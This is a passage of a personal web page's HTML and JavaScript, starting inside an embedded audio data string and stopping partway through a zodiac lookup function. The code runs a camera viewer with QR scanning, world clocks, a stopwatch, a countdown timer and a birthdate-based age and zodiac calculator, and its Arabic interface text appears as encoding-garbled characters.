A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/w" type="audio/mpeg">
    </audio>


    <script>
    document.addEventListener('DOMContentLoaded', () => {
        const videoElement = document.getElementById('camera-feed');
        const switchBtn = document.getElementById('switch-camera-btn');
        const filterSelect = document.getElementById('filter-select');
        const captureBtn = document.getElementById('capture-btn');
        const scanBtn = document.getElementById('scan-qr-btn');
        const canvas = document.getElementById('capture-canvas');
        const zoomContainer = document.getElementById('zoom-container');
        const zoomSlider = document.getElementById('zoom-slider');
        const qrBox = document.getElementById('qr-box');

        let currentStream;
        let videoDevices = [];
        let currentDeviceIndex = 0;
        let isScanning = false;
        let scanInterval;

        function stopScanning() {
            clearInterval(scanInterval);
            isScanning = false;
            qrBox.style.display = 'none';
            scanBtn.textContent = 'ğŸ”³ Ù…Ø³Ø­ QR';
        }

        function stopCurrentStream() {
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
            }
            stopScanning();
        }

        async function startStream(deviceId) {
            stopCurrentStream();
            const constraints = { audio: false, video: { deviceId: deviceId ? { exact: deviceId } : undefined } };
            
            try {
                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                videoElement.srcObject = currentStream;
                setupControls();
            } catch (err) {
                alert("Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§. Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ù…Ù†Ø­ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª Ø§Ù„Ù„Ø§Ø²Ù…Ø©.");
            }
        }
        
        function setupControls() {
            const track = currentStream.getVideoTracks()[0];
            const settings = track.getSettings();
            videoElement.style.transform = (settings.facingMode === 'user') ? 'scaleX(-1)' : 'scaleX(1)';
            const capabilities = track.getCapabilities();
            if (capabilities.zoom) {
                zoomSlider.min = capabilities.zoom.min;
                zoomSlider.max = capabilities.zoom.max;
                zoomSlider.step = capabilities.zoom.step;
                zoomSlider.value = settings.zoom || 1;
                zoomContainer.style.display = 'flex';
            } else {
                zoomContainer.style.display = 'none';
            }
        }

        async function initializeCamera() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                videoDevices = devices.filter(device => device.kind === 'videoinput');
                if (videoDevices.length > 0) {
                    if (videoDevices.length > 1) switchBtn.style.display = 'block';
                    await startStream(videoDevices[currentDeviceIndex].deviceId);
                } else {
                    alert("Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø£ÙŠ ÙƒØ§Ù…ÙŠØ±Ø§.");
                }
            } catch (err) {
                 console.error("Error enumerating devices:", err);
            }
        }
        
        function tick() {
            if (videoElement.readyState === videoElement.HAVE_ENOUGH_DATA) {
                canvas.height = videoElement.videoHeight;
                canvas.width = videoElement.videoWidth;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                const code = jsQR(imageData.data, imageData.width, imageData.height, {
                    inversionAttempts: "dontInvert",
                });

                if (code) {
                    stopScanning();
                    alert(`ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø±Ù…Ø²:\n${code.data}`);
                    try {
                        new URL(code.data);
                        window.open(code.data, '_blank');
                    } catch (_) {}
                }
            }
        }

        switchBtn.addEventListener('click', () => {
            if (videoDevices.length > 1) {
                currentDeviceIndex = (currentDeviceIndex + 1) % videoDevices.length;
                startStream(videoDevices[currentDeviceIndex].deviceId);
            }
        });

        filterSelect.addEventListener('change', () => {
            videoElement.style.filter = filterSelect.value;
        });

        zoomSlider.addEventListener('input', () => {
            const track = currentStream.getVideoTracks()[0];
            track.applyConstraints({ advanced: [{ zoom: zoomSlider.value }] });
        });

        captureBtn.addEventListener('click', () => {
            const ctx = canvas.getContext('2d');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            ctx.save();
            if (videoElement.style.transform === 'scaleX(-1)') {
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
            }
            ctx.filter = videoElement.style.filter;
            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            ctx.restore();
            const dataUrl = canvas.toDataURL('image/png');
            const link = document.createElement('a');
            link.href = dataUrl;
            link.download = `capture-${Date.now()}.png`;
            link.click();
        });
        
        scanBtn.addEventListener('click', () => {
            isScanning = !isScanning;
            if (isScanning) {
                scanBtn.textContent = 'Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ù…Ø³Ø­';
                qrBox.style.display = 'block';
                scanInterval = setInterval(tick, 250);
            } else {
                stopScanning();
            }
        });

        initializeCamera();
    });
    </script>
<script>
document.addEventListener('DOMContentLoaded', function() {
    // --- Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø¹Ù†Ø§ØµØ± ---
    const elements = {
        egyptTime: document.getElementById('egypt-time'),
        egyptDate: document.getElementById('egypt-date'),
        usaTime: document.getElementById('usa-time'),
        usaDate: document.getElementById('usa-date'),
        stopwatch: {
            display: document.getElementById('stopwatch-display'),
            startBtn: document.getElementById('start-stopwatch-btn'),
            stopBtn: document.getElementById('stop-stopwatch-btn'),
            resetBtn: document.getElementById('reset-stopwatch-btn')
        },
        countdown: {
            display: document.getElementById('countdown-display'),
            inputs: {
                hours: document.getElementById('hours-input'),
                minutes: document.getElementById('minutes-input'),
                seconds: document.getElementById('seconds-input')
            },
            startBtn: document.getElementById('start-timer-btn'),
            pauseBtn: document.getElementById('pause-timer-btn'),
            cancelBtn: document.getElementById('cancel-timer-btn'),
            alarm: document.getElementById('alarm-sound')
        }
    };

    // --- Ù‚Ø³Ù… Ø§Ù„Ø³Ø§Ø¹Ø© ÙˆØ§Ù„ØªØ§Ø±ÙŠØ® ---
    function updateClocks() {
        const now = new Date();
        const options = { hour12: true, hour: 'numeric', minute: 'numeric', second: 'numeric' };
        
        elements.egyptTime.textContent = now.toLocaleTimeString('ar-EG', { timeZone: 'Africa/Cairo', ...options });
        elements.egyptDate.textContent = now.toLocaleDateString('ar-EG', { timeZone: 'Africa/Cairo', weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });

        elements.usaTime.textContent = now.toLocaleTimeString('ar-EG', { timeZone: 'America/New_York', ...options });
        elements.usaDate.textContent = now.toLocaleDateString('ar-EG', { timeZone: 'America/New_York', weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
    }
    
    // --- Ù‚Ø³Ù… Ø³Ø§Ø¹Ø© Ø§Ù„Ø¥ÙŠÙ‚Ø§Ù (Stopwatch) ---
    let swState = { startTime: 0, elapsedTime: 0, intervalId: null, isRunning: false };

    function formatStopwatchTime(ms) {
        const d = new Date(ms);
        return `${String(d.getUTCMinutes()).padStart(2, '0')}:${String(d.getUTCSeconds()).padStart(2, '0')}.${String(d.getUTCMilliseconds()).padStart(3, '0')}`;
    }

    function updateStopwatchUI(isRunning) {
        elements.stopwatch.startBtn.disabled = isRunning;
        elements.stopwatch.stopBtn.disabled = !isRunning;
    }

    elements.stopwatch.startBtn.addEventListener('click', () => {
        if (swState.isRunning) return;
        swState.isRunning = true;
        swState.startTime = Date.now() - swState.elapsedTime;
        localStorage.setItem('sw_startTime', swState.startTime);
        localStorage.setItem('sw_isRunning', 'true');
        swState.intervalId = setInterval(() => {
            swState.elapsedTime = Date.now() - swState.startTime;
            elements.stopwatch.display.textContent = formatStopwatchTime(swState.elapsedTime);
        }, 10);
        updateStopwatchUI(true);
    });

    elements.stopwatch.stopBtn.addEventListener('click', () => {
        if (!swState.isRunning) return;
        swState.isRunning = false;
        clearInterval(swState.intervalId);
        localStorage.setItem('sw_elapsedTime', swState.elapsedTime);
        localStorage.setItem('sw_isRunning', 'false');
        updateStopwatchUI(false);
    });
    
    elements.stopwatch.resetBtn.addEventListener('click', () => {
        if(swState.isRunning) elements.stopwatch.stopBtn.click();
        swState.elapsedTime = 0;
        elements.stopwatch.display.textContent = formatStopwatchTime(0);
        localStorage.removeItem('sw_startTime');
        localStorage.removeItem('sw_elapsedTime');
        localStorage.removeItem('sw_isRunning');
    });

    // --- Ù‚Ø³Ù… Ù…Ø¤Ù‚Øª Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ (Timer) ---
    let cdState = { endTime: 0, remainingTime: 0, intervalId: null, isPaused: false };

    function formatCountdownTime(ms) {
        if (ms < 0) ms = 0;
        const s = Math.floor(ms / 1000);
        return `${String(Math.floor(s/3600)).padStart(2,'0')}:${String(Math.floor((s%3600)/60)).padStart(2,'0')}:${String(s%60).padStart(2,'0')}`;
    }

    function updateCountdownUI({isRunning, isPaused}) {
        elements.countdown.startBtn.disabled = isRunning || isPaused;
        elements.countdown.pauseBtn.disabled = !isRunning;
        elements.countdown.cancelBtn.disabled = !isRunning && !isPaused;
        Object.values(elements.countdown.inputs).forEach(input => input.disabled = isRunning || isPaused);
        elements.countdown.startBtn.textContent = isPaused ? "Ø§Ø³ØªØ¦Ù†Ø§Ù" : "Ø¨Ø¯Ø¡";
    }

    function runCountdown() {
        cdState.remainingTime = cdState.endTime - Date.now();
        elements.countdown.display.textContent = formatCountdownTime(cdState.remainingTime);
        if (cdState.remainingTime <= 0) {
            elements.countdown.alarm.play();
            elements.countdown.cancelBtn.click();
            elements.countdown.display.textContent = "Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„ÙˆÙ‚Øª!";
        }
    }

    elements.countdown.startBtn.addEventListener('click', () => {
        // *** Ø§Ù„Ø¬Ø²Ø¡ Ø§Ù„Ø°ÙŠ ØªÙ… ØªØ¹Ø¯ÙŠÙ„Ù‡ ***
        // Ù†Ù‚ÙˆÙ… Ø¨ØªØ´ØºÙŠÙ„ Ø§Ù„ØµÙˆØª ÙˆØ¥ÙŠÙ‚Ø§ÙÙ‡ ÙÙˆØ±Ù‹Ø§ Ø¹Ù†Ø¯ Ø§Ù„Ù†Ù‚Ø± Ø¹Ù„Ù‰ "Ø¨Ø¯Ø¡"
        // Ù‡Ø°Ø§ "ÙŠÙÙ‡ÙŠØ¦" Ø§Ù„ØµÙˆØª ÙˆÙŠØ³Ù…Ø­ Ù„Ù„Ù…ØªØµÙØ­ Ø¨ØªØ´ØºÙŠÙ„Ù‡ Ù„Ø§Ø­Ù‚Ù‹Ø§
        elements.countdown.alarm.play();
        elements.countdown.alarm.pause();
        elements.countdown.alarm.currentTime = 0; // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØµÙˆØª Ù„Ù„Ø¨Ø¯Ø§ÙŠØ©
        // *** Ù†Ù‡Ø§ÙŠØ© Ø§Ù„Ø¬Ø²Ø¡ Ø§Ù„Ù…Ø¹Ø¯Ù„ ***

        let totalMs;
        if (cdState.isPaused) {
            cdState.isPaused = false;
            cdState.endTime = Date.now() + cdState.remainingTime;
        } else {
            totalMs = (parseInt(elements.countdown.inputs.hours.value) * 3600 + 
                       parseInt(elements.countdown.inputs.minutes.value) * 60 + 
                       parseInt(elements.countdown.inputs.seconds.value)) * 1000;
            if (totalMs <= 0) return;
            cdState.endTime = Date.now() + totalMs;
        }
        
        localStorage.setItem('cd_endTime', cdState.endTime);
        localStorage.removeItem('cd_remainingTime');
        
        cdState.intervalId = setInterval(runCountdown, 200);
        updateCountdownUI({isRunning: true, isPaused: false});
    });

    elements.countdown.pauseBtn.addEventListener('click', () => {
        clearInterval(cdState.intervalId);
        cdState.isPaused = true;
        cdState.remainingTime = cdState.endTime - Date.now();
        localStorage.setItem('cd_remainingTime', cdState.remainingTime);
        localStorage.removeItem('cd_endTime');
        updateCountdownUI({isRunning: false, isPaused: true});
    });

    elements.countdown.cancelBtn.addEventListener('click', () => {
        clearInterval(cdState.intervalId);
        Object.assign(cdState, { endTime: 0, remainingTime: 0, intervalId: null, isPaused: false });
        localStorage.removeItem('cd_endTime');
        localStorage.removeItem('cd_remainingTime');
        elements.countdown.display.textContent = "00:00:00";
        updateCountdownUI({isRunning: false, isPaused: false});
    });

    // --- ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø­Ø§Ù„Ø§Øª Ø¹Ù†Ø¯ ÙØªØ­ Ø§Ù„ØµÙØ­Ø© ---
    function loadInitialState() {
        // Ø§Ù„Ø³Ø§Ø¹Ø§Øª
        updateClocks();
        setInterval(updateClocks, 1000);

        // Ø³Ø§Ø¹Ø© Ø§Ù„Ø¥ÙŠÙ‚Ø§Ù
        const swIsRunning = localStorage.getItem('sw_isRunning') === 'true';
        if (swIsRunning) {
            swState.elapsedTime = Date.now() - parseInt(localStorage.getItem('sw_startTime'));
            elements.stopwatch.startBtn.click();
        } else {
            swState.elapsedTime = parseInt(localStorage.getItem('sw_elapsedTime')) || 0;
            elements.stopwatch.display.textContent = formatStopwatchTime(swState.elapsedTime);
        }
        updateStopwatchUI(swState.isRunning);

        // Ø§Ù„Ù…Ø¤Ù‚Øª
        const cdEndTime = parseInt(localStorage.getItem('cd_endTime'));
        const cdRemainingTime = parseInt(localStorage.getItem('cd_remainingTime'));
        if (cdEndTime) {
            cdState.endTime = cdEndTime;
            cdState.intervalId = setInterval(runCountdown, 200);
            updateCountdownUI({isRunning: true, isPaused: false});
        } else if (cdRemainingTime) {
            cdState.isPaused = true;
            cdState.remainingTime = cdRemainingTime;
            elements.countdown.display.textContent = formatCountdownTime(cdRemainingTime);
            updateCountdownUI({isRunning: false, isPaused: true});
        }
        updateCountdownUI({isRunning: !!cdState.intervalId, isPaused: cdState.isPaused});
    }

    loadInitialState();
});
// script.js

function calculate() {
    const birthdateString = document.getElementById('birthdate').value;
    const resultDiv = document.getElementById('result');

    if (!birthdateString) {
        resultDiv.innerHTML = '<p style="color: red; text-align: center;">Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ ØªØ§Ø±ÙŠØ® Ù…ÙŠÙ„Ø§Ø¯ ØµØ­ÙŠØ­.</p>';
        return;
    }

    const birthDate = new Date(birthdateString);
    const today = new Date();

    let age = today.getFullYear() - birthDate.getFullYear();
    const monthDifference = today.getMonth() - birthDate.getMonth();
    if (monthDifference < 0 || (monthDifference === 0 && today.getDate() < birthDate.getDate())) {
        age--;
    }

    const day = birthDate.getDate();
    const month = birthDate.getMonth() + 1;
    
    const zodiacData = getZodiacData(day, month);

    if (zodiacData) {
        resultDiv.innerHTML = `
            <h3>Ø§Ù„Ù†ØªØ§Ø¦Ø¬</h3>
            <p style="color: Gold; text-align: center;"><strong>Ø¹Ù…Ø±Ùƒ Ù‡Ùˆ:</strong> ${age} Ø³Ù†Ø©</p>
            <p style="color: gold; text-align: center;"<strong>Ø¨Ø±Ø¬Ùƒ Ø§Ù„ÙÙ„ÙƒÙŠ Ù‡Ùˆ:</strong> ${zodiacData.name}</p>
            <p class="motto">"${zodiacData.motto}"</p>
            <p style="color: gold; text-align: center;"><strong>ØµÙØ§Øª Ø¨Ø±Ø¬Ùƒ:</strong> ${zodiacData.info}</p>
        `;
    } else {
        resultDiv.innerHTML = '<p style="color: red; text-align: center;">Ù„Ø§ ÙŠÙ…ÙƒÙ† ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ø¨Ø±Ø¬ØŒ ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØªØ§Ø±ÙŠØ®.</p>';
    }
}

function getZodiacData(day, month) {
    if ((month == 3 && day >= 21) || (month == 4 && day <= 19)) {
        return { 
            name: "â™ˆ Ø§Ù„Ø­Ù…Ù„", 
            motto: "Ø£Ù†Ø§ Ø£Ø¨Ø§Ø¯Ø±ØŒ Ø¥Ø°Ù† Ø£Ù†Ø§ Ù…ÙˆØ¬ÙˆØ¯.",
            info: "ÙŠØªÙ…ÙŠØ² Ù…ÙˆØ§Ù„ÙŠØ¯ Ø¨Ø±Ø¬ Ø§Ù„Ø­Ù…Ù„ Ø¨Ø§Ù„Ø´Ø¬Ø§Ø¹Ø©ØŒ Ø§Ù„Ø­Ù…Ø§Ø³ØŒ ÙˆØ§Ù„Ø«Ù‚Ø© Ø¨Ø§Ù„Ù†ÙØ³. Ù‡Ù… Ù‚Ø§Ø¯Ø© Ø¨Ø§Ù„ÙØ·Ø±Ø© ÙˆÙŠØ­Ø¨ÙˆÙ† Ø§Ù„Ù…ØºØ§Ù…Ø±Ø§Øª ÙˆØ§Ù„ØªØ­Ø¯ÙŠØ§ØªØŒ ÙˆÙ„Ø§ ÙŠØ®Ø´ÙˆÙ† Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ø´Ø§Ø±ÙŠØ¹ Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©." 
        };
    } else if ((month == 4 && day >= 20) || (month == 5 && day <= 20)) {
        return { 
            name: "â™‰ Ø§Ù„Ø«ÙˆØ±", 
            motto: "Ø£Ù†Ø§ Ø£Ù…ØªÙ„ÙƒØŒ Ø¥Ø°Ù† Ø£Ù†Ø§ Ù…Ø³ØªÙ‚Ø±.",
            info: "ÙŠÙØ¹Ø±Ù Ù…ÙˆØ§Ù„ÙŠØ¯ Ø¨Ø±Ø¬ Ø§Ù„Ø«ÙˆØ± Ø¨Ø§Ù„ØµØ¨Ø±ØŒ Ø§Ù„Ù…ÙˆØ«ÙˆÙ‚ÙŠØ©ØŒ ÙˆØ­Ø¨Ù‡Ù… Ù„Ù„Ø§Ø³ØªÙ‚Ø±Ø§Ø± ÙˆØ§Ù„Ø¬Ù…Ø§Ù„. Ø¹Ù…Ù„ÙŠÙˆÙ† ÙˆÙŠÙ‚Ø¯Ø±ÙˆÙ† Ø§Ù„Ø±Ø§Ø­Ø© ÙˆØ§Ù„Ø£Ø´ÙŠØ§Ø¡ Ø§Ù„Ù…Ø§Ø¯ÙŠØ© Ø§Ù„Ø¬ÙŠØ¯Ø© ÙÙŠ Ø§Ù„Ø­ÙŠØ§Ø©." 
        };
    } else if ((month == 5 && day >= 21) || (month == 6 && day <= 20)) {
        return { 
            name: "â™Š Ø§Ù„Ø¬ÙˆØ²Ø§Ø¡", 
            motto: "Ø£Ù†Ø§ Ø£ÙÙƒØ±ØŒ Ø¥Ø°Ù† Ø£Ù†Ø§ Ø£ØªÙˆØ§ØµÙ„.",
            info: "Ù…ÙˆØ§Ù„ÙŠØ¯ Ø§Ù„Ø¬ÙˆØ²Ø§Ø¡ ÙØ¶ÙˆÙ„ÙŠÙˆÙ†ØŒ Ø§Ø¬ØªÙ…Ø§Ø¹ÙŠÙˆÙ†ØŒ ÙˆÙ‚Ø§Ø¯Ø±ÙˆÙ† Ø¹Ù„Ù‰ Ø§Ù„ØªÙƒÙŠÙ. ÙŠØ­Ø¨ÙˆÙ† Ø§Ù„ØªÙˆØ§ØµÙ„ ÙˆØªØ¨Ø§Ø¯Ù„ Ø§Ù„Ø£ÙÙƒØ§Ø± ÙˆÙ‡Ù… Ø³Ø±ÙŠØ¹Ùˆ Ø§Ù„Ø¨Ø¯ÙŠÙ‡Ø© ÙˆÙ„Ø¯ÙŠÙ‡Ù… Ø¹Ù‚Ù„ Ù†Ø´Ø· Ù„Ø§ ÙŠÙ‡Ø¯Ø£." 
        };
    } else if ((month == 6 && day >= 21) || (month == 7 && day <= 22)) {
        return { 
            name: "â™‹ Ø§Ù„Ø³Ø±Ø·Ø§Ù†", 
            motto: "Ø£Ù†Ø§ Ø£Ø´Ø¹Ø±ØŒ Ø¥Ø°Ù† Ø£Ù†Ø§ Ø£Ù‡ØªÙ….",
            info: "ÙŠØªÙ…ÙŠØ² Ù…ÙˆØ§Ù„ÙŠØ¯ Ø§Ù„Ø³Ø±Ø·Ø§Ù† Ø¨Ø§Ù„Ø¹Ø§Ø·ÙØ© Ø§Ù„Ù‚ÙˆÙŠØ©ØŒ Ø§Ù„ÙˆÙ„Ø§Ø¡ØŒ ÙˆØ­Ø¨Ù‡Ù… Ù„Ù„Ø£Ø³Ø±Ø©. Ù‡Ù… Ø­Ø³Ø§Ø³ÙˆÙ† Ø¬Ø¯Ø§Ù‹ØŒ ÙŠÙ…ØªÙ„ÙƒÙˆÙ† Ø®ÙŠØ§Ù„Ø§Ù‹ ÙˆØ§Ø³Ø¹Ø§Ù‹ØŒ ÙˆÙŠÙˆÙØ±ÙˆÙ† Ø§Ù„Ø£Ù…Ø§Ù† Ù„Ù…Ù† ÙŠØ­Ø¨ÙˆÙ†." 
        };
    } else if ((month == 7 && day >= 23) || (month == 8 && day <= 22)) {
        return { 
            name: "â™Œ Ø§Ù„Ø£Ø³Ø¯", 
            motto: "Ø£Ù†Ø§ Ø£Ø±ÙŠØ¯ØŒ Ø¥Ø°Ù† Ø£Ù†Ø§ Ø£Ø¨Ø¯Ø¹.",
            info: "Ù…ÙˆØ§Ù„ÙŠØ¯ Ø§Ù„Ø£Ø³Ø¯ ÙƒØ±Ù…Ø§Ø¡ØŒ Ù…Ø¨Ø¯Ø¹ÙˆÙ†ØŒ ÙˆÙŠÙ…ØªÙ„ÙƒÙˆÙ† Ø´Ø®ØµÙŠØ© Ù‚ÙŠØ§Ø¯ÙŠØ©. ÙŠØ­Ø¨ÙˆÙ† Ø£Ù† ÙŠÙƒÙˆÙ†ÙˆØ§ Ù…Ø±ÙƒØ² Ø§Ù„Ø§Ù‡ØªÙ…Ø§Ù…ØŒ ÙÙ‡Ù… Ø¯Ø§ÙØ¦ÙˆÙ† Ø§Ù„Ù‚Ù„Ø¨ ÙˆÙŠØ³Ø¹ÙˆÙ† Ù„Ù„ØªØ¹Ø¨ÙŠØ± Ø¹Ù† Ø£Ù†ÙØ³Ù‡Ù…." 
        };
    } else if ((month == 8 && day >= 23) || (month == 9 && day <= 22)) {
        return { 
            name: "â™ Ø§Ù„Ø¹Ø°Ø±Ø§Ø¡", 
            motto: "Ø£Ù†Ø§ Ø£Ø­Ù„Ù„ØŒ Ø¥Ø°Ù† Ø£Ù†Ø§ Ø£Ø®Ø¯Ù….",
            info: "ÙŠÙØ¹Ø±Ù Ù…ÙˆØ§Ù„ÙŠØ¯ Ø§Ù„Ø¹Ø°Ø±Ø§Ø¡ Ø¨Ø§Ù„Ø¯Ù‚Ø©ØŒ Ø§Ù„ØªØ­Ù„ÙŠÙ„ØŒ ÙˆØ§Ù„Ø¹Ù…Ù„ Ø§Ù„Ø¬Ø§Ø¯. ÙŠÙ‡ØªÙ…ÙˆÙ† Ø¨Ø§Ù„ØªÙØ§ØµÙŠÙ„ØŒ Ø¹Ù…Ù„ÙŠÙˆÙ†ØŒ ÙˆÙ…Ø®Ù„ØµÙˆÙ†ØŒ ÙˆÙŠØ³Ø¹ÙˆÙ† Ø¯Ø§Ø¦Ù…Ø§Ù‹ Ù„Ù„ØªØ­Ø³ÙŠÙ† ÙˆØ§Ù„ÙƒÙ…Ø§Ù„." 
        };
    } else if ((month == 9 && day >= 23) || (month == 10 && day <= 22)) {
        return { 
            name: "â™ Ø§Ù„Ù…ÙŠØ²Ø§Ù†", 
